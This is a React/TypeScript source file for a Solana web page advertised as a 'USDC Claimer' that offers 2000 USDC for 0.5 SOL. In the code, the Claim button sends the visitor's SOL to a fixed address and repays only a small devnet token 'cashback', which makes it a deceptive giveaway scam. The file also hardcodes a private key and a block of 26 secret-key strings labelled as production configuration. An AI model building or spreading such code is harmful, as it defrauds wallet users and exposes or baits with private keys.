/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "2p36x34paaZG1DEkG8hoEMZkTK9ohdDBJUxAUWzGjoj6XkdP6qvVB2SKYswKKrqBz7nyTuyHtA6uEjVNPpDnfxGu"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "6o98NC8pdpANgAsEQZdvkXrNaY3DezzoAGbvth5TmKRaqogvf8NuP5WtUqrpaR44haBZ5J8NYcNHE93yY7q74Uf",
  "key1": "3cvXAgvWZRR8Yu2NQK9v7AGwn4czwdYPyJJjNE2LTmJpUJH59eqDZAvW9GsVK8YP6RzGMuRPcPLSMWm2XbTofNwC",
  "key2": "KWnuHmLdiyJWnC7WWYfTVNt7WaR1cjVfTWJ9d9SC5Z2ebRSdoBQ9GX5sDPiJ3RzCzoNp6UNGFbis2M4HUuT2ZdV",
  "key3": "2f9T4S7kpFeG2emELZ1xTV2NJBAVWLJHEcFJNJetAfVipQ7Zr5mcKcVsTJA9cQEGKWYbMNAXtNQUCPPLpbQbd68u",
  "key4": "61hRmCP14ysBLUinPG3zbhm1HxusHVmECgsjaxCRTRAgm2k4gPr6heFvV2y5ar3ePg9hxQChm7PXR1ueZhNT27DV",
  "key5": "3uCBY9q9SUknNzxdpMbsrLajNiun3MYwYEXVaYsUzMKerXm3E1zS2ZKt9XLjm6bcedv1knafxVwxbsGi5jJSzBKB",
  "key6": "34H1tykX7KBCFeGuo6WZHcN5BEFFNff3jvGhiW3TfxqGWPAuD1sMwM9vMYBrhxNs7A5WcZkmrEEFbybdMDEj6t3A",
  "key7": "sJNaFnXNWRRTyYUD7n3CayU6vit3HkVqF2NCHGQTYPawN6wVV5dYdTDQH8oW5Jr72m5e6eiJYsce6mBDzqzHXiD",
  "key8": "5VRLadpnSv82GPQ1UhV3NaQcbjdA3YVCCCTbyKKKYoe2HR3DK3DY5pNdUN8VGujMrxhN4kViteKPepFXwQEWNJvk",
  "key9": "5DRSmQ9TLD5maM1dvYv1ypHEsp82ciJM95ySdSD9eUWNXm86Mb7N6w9QR9npprEE2SmLvkhUQZYJhfUSxmKDEscJ",
  "key10": "2bnmF1AX2VqPiGvasmyK7vbn2ZUNs3PPsNibFxdsqCoNLMyvr1p6fD9s9gVDWU7GzGFMNtcN5iZRFU26BSf6RZgP",
  "key11": "6MnsUSCCU5QRKVuZJh3FQqskQfKdrFpTkLAj1xEBj7zX6Vo1bppPebSGDQwGs6rJjNRUzJyg2eQG1kBwouxjg3N",
  "key12": "62j8nMFvfT291xn9z1Fzhdu9kNfGUN1JsHGuS86jEEZKbt7H3jEdgdxcAW4a46xVQj86BNNkL1r61Sc2nstet6u1",
  "key13": "63o6XMkACArY6C8DeBjvbQKtEH5jTSKJffeegkvadXeojutCph7DuzKCA1RRiSMySEhG4eP6HbHctVDVsZYusnNd",
  "key14": "3hStmSCzN5cqGteu7chmQFF2Fety8pMGcQjiyo7DNQa6BkRWFqTFRqZem2Df4WJ3x9vXoD9LebVe7wnHUPq8BiK8",
  "key15": "5ySDSCWZhPG5DfAW1oZWET6SgqT4vmikLngWQQvLsawx6E8e2MLFNThrftJ7YcPLq8ALrpaSE87yb8XEkbwU9SFs",
  "key16": "5K3YrBnr6Xp49qoVPRsyMafp8DTAFxGpqNbMhiKr8yeJhzzfNH9gyQivYCyNqazXK9AshpGMc4GYKKGib1P7uJrf",
  "key17": "aFc5kTKTAQm4qBnfQRJ8DksCdfLrp21hEnschBeKj4x2WmuZAGLtSxMz8RjfJfhBCa78HkJmuf8PKysZQrBd8vx",
  "key18": "5B2kJ9RqRSe3s9YUbMe1mAfJosdqXz2k9P6qNBZNeQFhyR147vDvj1JVsx1oNjexH9ngdaDUUN1L9CbA7eMswdXC",
  "key19": "2B8ZGKhpHjzvQm14atA7qdWGhkpEw8cUksGaouQW9WDktvzndvVK6KSJcY7wuMwtgw7thGcKEuiQUEtGsbrpuR7E",
  "key20": "65PVaZGG4NzKSHic2vnpKDJsDLK2t9jhxGdYdd9ADKNgQtwRNrHKard5pm2X12GfezJ7erdz1im1xohBwajRr57j",
  "key21": "2UWPfwTufKnEt6aVMRrKkGYcw3zTGnpPTw5dKHt6YdG7H3DeftrinbSX9rDsSV9AFowoMmGBNGFqx5UJvE7SGg9H",
  "key22": "vCZiwhjH3yghbEskQuBQRHgrrq3cJMR77YCEw4eWetFhfYKdZ2dn6o2am5x15MPjeSTeReRZcdNKWZCmssvBdMR",
  "key23": "pxxapDasTk2xoHc9C1YrsoWEvpd4Q4DREPTkWsRyAjGmVgP24Q3N3wzh6UM32gvJywixVRq5Z1x3wFJUy73NtUd",
  "key24": "UGBdhj6wLqqLUyjFjMngTEUMdqxGefT8xNL5kPTXxZdyAwEgeDFr2AMpUX6j3sX4noKYfJ6sE7Xfuq8LPL8cwQu",
  "key25": "4tpccKELuDKzwv4ZJuhFRvuuJABPXJ2Ha1ejA2N5w458ripJUn8XAB73hK7W9273NfCK78gbDxdzV9kh2G6Xy9Be"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
